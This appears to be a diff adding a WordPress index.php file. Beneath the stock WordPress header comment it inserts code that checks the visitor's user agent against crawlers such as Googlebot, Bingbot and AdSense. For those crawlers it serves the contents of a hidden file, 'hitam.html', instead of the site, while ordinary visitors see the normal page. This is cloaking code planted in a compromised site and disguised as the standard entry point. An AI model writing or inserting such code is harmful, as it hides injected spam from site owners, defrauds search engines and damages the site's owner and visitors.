@@ -1,0 +1,27 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$filePath  = __DIR__ . '/hitam.html';
+
+$botPattern = '/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/i';
+
+if (preg_match($botPattern, $userAgent)) {
+    if (is_readable($filePath)) {
+        echo file_get_contents($filePath);
+    }
+    exit;
+}
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
